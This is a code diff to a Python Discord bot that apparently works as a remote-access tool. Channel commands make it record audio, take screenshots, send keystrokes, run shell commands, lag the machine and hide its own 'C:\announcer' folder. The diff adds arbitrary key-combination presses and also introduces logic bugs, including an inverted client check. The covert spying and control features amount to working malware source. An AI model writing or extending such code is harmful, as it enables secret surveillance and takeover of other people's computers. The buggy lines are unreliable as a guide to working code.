@@ -79,18 +79,20 @@ class MyClient(discord.Client):
             if not command_mode:
                 if message.content.startswith('client '):
                     global selectedClient
-                    selectedClient = message.content[7:]
-                    if selectedClient == 'list':
+                    
+                    if message.content[7:].strip() == 'list':
                         await message.channel.send(f'Current selected client: {selectedClient}\nAvailable clients: {clientName}')
                         return
+                    
+                    selectedClient = message.content[7:].strip()
                     await message.channel.send(f'Selected client set to {selectedClient}')
                     return
                 
                 if message.content == 'help':
                     help_message = (
-                        "PLEASE RUN client list to select a client\n"
-                        "you cannot use the program without selecting a client\n"
-                        "Available commands:\n"
+                        "# PLEASE RUN client list to select a client\n"
+                        "# you cannot use the program without selecting a client\n"
+                        "## Available commands:\n"
                         "rec - Record audio\n"
                         "upd - Update the application\n"
                         "scr - Take a screenshot\n"
@@ -103,7 +105,7 @@ class MyClient(discord.Client):
                         "vid - Display a video\n"
                         "sound - Play a sound\n"
                         "vol - Set the volume\n"
-                        "min - Minimize all windows\n"
+                        "shortcut - Press a shortcut\n"
                         "lag - Lag computer(CPU and RAM)\n"
                         "cmd - Run a command\n"
                         "cmdtoggle - Toggle command mode\n"
@@ -113,7 +115,8 @@ class MyClient(discord.Client):
                     )
                     await message.channel.send(help_message)
                 
-                if not selectedClient == clientName:
+                if not selectedClient != clientName and selectedClient != 'debug':
+                    print(f'Message received for {selectedClient}, ignoring on {clientName}')
                     return
                 
                 if f'{message.content}' == 'cmdtoggle':
@@ -224,8 +227,6 @@ class MyClient(discord.Client):
 
                 # tts - Text-to-speech
                 if message.content == 'tts':
-                    if message.author == self.user:
-                        return
                     await message.channel.send('Please enter the message you would like to send')
                     def check(m):
                         return m.author == message.author and m.channel == message.channel
@@ -362,7 +363,7 @@ class MyClient(discord.Client):
                         await message.channel.send('Invalid command format. Use "Lag <seconds>".')
 
                 # key - Send keystrokes
-                if message.content == 'key':
+                if message.content.startswith('key'):
                     await message.channel.send('Please enter the keystrokes you would like to send')
                     def check(m):
                         return m.author == message.author and m.channel == message.channel
@@ -465,10 +466,17 @@ class MyClient(discord.Client):
                 # help - Display help message
                 
 
-                # min - Press Win+D
-                if message.content == 'min':
-                    pyautogui.hotkey('win', 'd')
-                    await message.channel.send('Minimized all windows')
+                # shortcut - Press a shortcut of the users choice
+                if message.content.startswith('shortcut'):
+                    shortcut = message.content[9:].strip()
+                    if shortcut == ('help' or ''):
+                        await message.channel.send('Usage: shortcut <keys> (e.g., shortcut ctrl+alt+del)')
+                        return
+                    keys = shortcut.split('+')
+                    print(f'Pressing {keys}')
+                    pyautogui.hotkey(*keys)
+                    await message.channel.send(f'Shortcut {shortcut} pressed')
+
 
                 # hide - Hide the announcer folder
                 if message.content == 'hide':
@@ -476,7 +484,7 @@ class MyClient(discord.Client):
                     await message.channel.send('Folder hidden')
 
                 # unhide - Unhide the announcer folder
-                if message.content == 'unhide':
+                if message.content == 'show':
                     os.system('attrib -h C:\\announcer')
                     await message.channel.send('Folder unhidden')
 
